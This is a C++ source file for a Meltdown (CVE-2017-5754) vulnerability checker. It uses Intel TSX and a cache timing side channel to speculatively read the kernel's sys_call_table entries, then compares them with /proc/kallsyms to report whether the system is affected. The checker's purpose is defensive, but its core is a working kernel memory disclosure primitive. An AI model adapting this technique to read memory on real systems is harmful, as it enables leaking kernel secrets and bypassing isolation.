/*
 * Copyright (c) 2018, Raphael S. Carvalho <raphael.scarv@gmail.com>
 * All rights reserved.
 *
 *Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 * 
 * 1. Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

#include <cstdio>
#include <unordered_map>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <limits>
#include <algorithm>
#include <sys/mman.h>
#include <immintrin.h>
#include <errno.h>
#include <unistd.h>
#include "assembly_utils.hh"

#define __DEBUG__

static constexpr size_t total_pages = 256;
static const char* syscall_table_symbol = "sys_call_table";
static const char* syscall_table_symbol_entry_prefix = "sys_";
// TODO: include linux header that define amount of addresses to read.
static constexpr unsigned syscall_table_entries = 10;
static constexpr size_t syscall_table_entry_read_retries = 5;

static unsigned page_size() {
    static unsigned __page_size = 0;
    if (!__page_size) {
        __page_size = getpagesize();
    }
    return __page_size;
}

static unsigned mem_size() {
    return total_pages * getpagesize();
}

unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
    std::array<unsigned long, total_pages>  durations;
    int min_duration = std::numeric_limits<int>::max();

    for (auto c = 0; c < syscall_table_entry_read_retries; c++) {
        if (_xbegin() == _XBEGIN_STARTED) {
            __speculative_byte_load(ptr, buf);
            _xend();
        } else {
            // nothing
        }

        // check which cache line likely had speculative load stored by speculative execution above,
        // by measuring access time to them and seeing which one had the fastest access.
        for (auto i = 0; i < total_pages; i++) {
            durations[i] = __speculative_loaded_byte_probe(&buf[i * page_size()]);

            min_duration = (min_duration == std::numeric_limits<int>::max()
                    || durations[min_duration] > durations[i]) ? i : min_duration;
        }
    }
    return (unsigned char)(min_duration);
}

//
// Syscall table is valid if any entry matches the address in the symbol map.
//
static bool validate_syscall_table_entries(void* addr, const void* data, size_t size, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
    uint64_t* entry = (uint64_t*) data;

    for (auto i = 0; i < (size / 8); i++) {
        uintptr_t ptr = reinterpret_cast<uintptr_t>(entry[i]);
#ifdef __DEBUG__
        printf("0x%016lx -> That's %s\n", (uintptr_t)ptr, symbol_map.count(ptr) ? symbol_map.at(ptr).c_str() : "unknown");
#endif
        if (symbol_map.count(ptr)) {
            auto symbol = symbol_map.at(ptr);
            std::transform(symbol.begin(), symbol.end(), symbol.begin(), ::tolower);
            auto ret = symbol.find(syscall_table_symbol_entry_prefix);
            if (ret > 0 || ret == std::string::npos) {
                continue;
            }
            return true;
        }
    }
    return false;
}

static bool probe_one_syscall_table_address(uintptr_t target_address, char* mem, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
    size_t address_size = sizeof(uintptr_t);
    unsigned char buffer[address_size];

    for (auto i = 0; i < address_size; i++) {
        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, mem);
    }
    return validate_syscall_table_entries(reinterpret_cast<void*>(target_address), buffer, address_size, symbol_map);
}


static std::unordered_map<uintptr_t, std::string> build_symbol_map() {
    std::unordered_map<uintptr_t, std::string> symbol_map;

    std::ifstream infile("/proc/kallsyms");
    if (!infile.is_open()) {
        std::cout << "Failed to open /proc/kallsyms. Unable to proceed.\n";
        abort();
    }

    std::string line;

    while (std::getline(infile, line)) {
        std::istringstream iss(line);
        uintptr_t addr;
        std::string type, symbol;

        if (!(iss >> std::hex >> addr >> type >> symbol)) {
            std::cout << "error in line: " << line << std::endl;
            abort();
        } // error

        symbol_map.emplace(addr, std::move(symbol));
    }
    return symbol_map;
}

static uintptr_t symbol_map_reverse_search(const std::unordered_map<uintptr_t, std::string>& symbol_map, std::string symbol) {
    for (auto& p : symbol_map) {
        if (p.second == symbol) {
            return p.first;
        }
    }
    std::cout << "Unable to find symbol " << symbol << " in symbol map. Aborting...";
    abort();
}

static void require_TSX() {
    static constexpr int hle_mask = 1<<4;
    static constexpr int rtm_mask = 1<<11;

    unsigned eax = 7;
    unsigned ebx = 0;
    unsigned ecx = 0;

    __asm__ __volatile__ ( "movl %%ebx, %%esi\n"
                           "cpuid\n"
                           "movl %%ebx, %0\n"
                           "movl %%esi, %%ebx\n"
                           : "=a"(ebx) : "0" (eax), "c" (ecx) : "esi",
                           "ebx",
                           "edx"
                           );
    bool has_hle = (ebx & hle_mask) != 0;
    bool has_rtm = (ebx & rtm_mask) != 0;

    if (!has_hle || !has_rtm) {
        printf("Your cpu doesn't support TSX (Transactional Synchronization Extensions)\n" \
            "Check https://software.intel.com/en-us/node/524022 for details;\n");
        abort();
    }
}

int main(int argc, char** argv) {
    // TODO: do not require TSX to run checker anymore.
    require_TSX();

    auto mem = static_cast<char*>(mmap(nullptr, mem_size(), PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0));

    if (mem == MAP_FAILED) {
        printf("mmap() failed: %s\n", strerror(errno));
        return -1;
    }

    auto symbol_map = build_symbol_map();
    auto target_address = symbol_map_reverse_search(symbol_map, syscall_table_symbol);

    std::cout << "Checking whether system is affected by Variant 3: rogue data cache load (CVE-2017-5754), a.k.a MELTDOWN ...\n";

#ifdef __DEBUG__
    printf("Checking syscall table (sys_call_table) found at address 0x%016lx ...\n", (uintptr_t)target_address);
#endif

    for (auto entry = 0; entry < syscall_table_entries; entry++) {
        auto ret = probe_one_syscall_table_address(target_address + entry * sizeof(uintptr_t), mem, symbol_map);
        if (ret) {
            std::cout << "\nSystem affected! Please consider upgrading your kernel to one that is patched with KAISER\n";
            std::cout << "Check https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html for more details\n";
            goto out;
        }
    }
    std::cout << "\nSystem not affected. Congratulations!\n";
out:
    return munmap(static_cast<void*>(mem), mem_size());
}
